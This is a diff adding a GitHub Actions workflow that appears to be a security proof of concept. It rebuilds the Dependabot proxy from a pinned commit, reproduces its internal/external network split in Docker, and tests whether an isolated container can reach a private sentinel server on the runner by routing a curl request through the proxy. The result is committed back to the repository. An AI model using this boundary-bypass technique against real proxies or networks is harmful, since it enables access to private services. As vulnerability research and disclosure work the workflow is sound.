@@ -1,0 +1,127 @@
+name: dependabot-private-network-boundary-probe
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/dependabot-private-network-boundary-probe.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout lab repository
+        uses: actions/checkout@v7
+        with:
+          path: verdict-repo
+
+      - name: Checkout exact Dependabot proxy source
+        uses: actions/checkout@v7
+        with:
+          repository: dependabot/proxy
+          ref: cf74f6f9338ce8eb899ce8e472eaed6a19238a5b
+          path: proxy-src
+          persist-credentials: false
+
+      - name: Build exact proxy and reproduce production network boundary
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd "$GITHUB_WORKSPACE"
+
+          # Harmless service on this GitHub-hosted runner only.
+          mkdir -p host-sentinel
+          printf 'DEPENDABOT_PRIVATE_NETWORK_SENTINEL_51c0\n' > host-sentinel/sentinel.txt
+          nohup python3 -m http.server 18080 --bind 0.0.0.0 --directory host-sentinel > "$RUNNER_TEMP/host-http.log" 2>&1 &
+          echo $! > "$RUNNER_TEMP/host-http.pid"
+          sleep 1
+
+          # Exact current Dependabot proxy source.
+          docker build -t db-proxy-poc:current proxy-src
+
+          # Same topology as github/dependabot-action: updater sees only an internal
+          # network; proxy is dual-homed to internal + external networks.
+          docker network create db-poc-external >/dev/null
+          docker network create --internal db-poc-internal >/dev/null
+
+          # Proxy startup requires a CA even though this PoC uses plain HTTP.
+          openssl req -x509 -newkey rsa:2048 -nodes \
+            -keyout "$RUNNER_TEMP/ca.key" -out "$RUNNER_TEMP/ca.crt" \
+            -subj '/CN=Dependabot PoC CA' -days 1 >/dev/null 2>&1
+          python3 - <<'PY'
+          import json, os
+          from pathlib import Path
+          cfg = {
+            'all_credentials': [],
+            'ca': {
+              'cert': Path(os.environ['RUNNER_TEMP'] + '/ca.crt').read_text(),
+              'key': Path(os.environ['RUNNER_TEMP'] + '/ca.key').read_text(),
+            },
+            'proxy_auth': {'username': '', 'password': ''},
+          }
+          Path(os.environ['RUNNER_TEMP'] + '/proxy-config.json').write_text(json.dumps(cfg))
+          PY
+
+          docker run -d --name db-poc-proxy \
+            --network db-poc-internal \
+            -v "$RUNNER_TEMP/proxy-config.json:/config.json:ro" \
+            db-proxy-poc:current -config /config.json >/dev/null
+          docker network connect db-poc-external db-poc-proxy
+
+          PROXY_IP=$(docker inspect -f '{{(index .NetworkSettings.Networks "db-poc-internal").IPAddress}}' db-poc-proxy)
+          HOST_GATEWAY=$(docker network inspect db-poc-external -f '{{(index .IPAM.Config 0).Gateway}}')
+
+          RESULT="$GITHUB_WORKSPACE/verdict-repo/security-probe-results/dependabot-private-network-boundary.txt"
+          mkdir -p "$(dirname "$RESULT")"
+          : > "$RESULT"
+          echo 'source_revision=cf74f6f9338ce8eb899ce8e472eaed6a19238a5b' >> "$RESULT"
+          echo 'updater_network_internal=true' >> "$RESULT"
+          echo 'proxy_dual_homed=true' >> "$RESULT"
+          echo 'destination_class=docker_external_bridge_gateway_runner_host' >> "$RESULT"
+
+          set +e
+          BODY=$(docker run --rm --network db-poc-internal curlimages/curl:8.16.0 \
+            --silent --show-error --max-time 10 \
+            --proxy "http://${PROXY_IP}:1080" \
+            "http://${HOST_GATEWAY}:18080/sentinel.txt" 2>"$RUNNER_TEMP/updater-curl.err")
+          EC=$?
+          set -e
+
+          echo "updater_proxy_request_exit=$EC" >> "$RESULT"
+          if [[ "$BODY" == 'DEPENDABOT_PRIVATE_NETWORK_SENTINEL_51c0' ]]; then
+            echo 'runner_host_private_service_reached=true' >> "$RESULT"
+          else
+            echo 'runner_host_private_service_reached=false' >> "$RESULT"
+          fi
+
+          # Negative architecture proof: updater itself has no external egress route.
+          set +e
+          docker run --rm --network db-poc-internal curlimages/curl:8.16.0 \
+            --silent --max-time 3 "http://${HOST_GATEWAY}:18080/sentinel.txt" \
+            > "$RUNNER_TEMP/direct.out" 2>/dev/null
+          DIRECT_EC=$?
+          set -e
+          echo "direct_internal_only_request_exit=$DIRECT_EC" >> "$RESULT"
+          if grep -q 'DEPENDABOT_PRIVATE_NETWORK_SENTINEL_51c0' "$RUNNER_TEMP/direct.out" 2>/dev/null; then
+            echo 'direct_internal_only_reached_host=true' >> "$RESULT"
+          else
+            echo 'direct_internal_only_reached_host=false' >> "$RESULT"
+          fi
+
+          docker logs db-poc-proxy > "$RUNNER_TEMP/proxy.log" 2>&1 || true
+
+      - name: Commit verdict
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd verdict-repo
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add security-probe-results/dependabot-private-network-boundary.txt
+          git commit -m 'Record Dependabot private-network boundary probe' || exit 0
+          git push
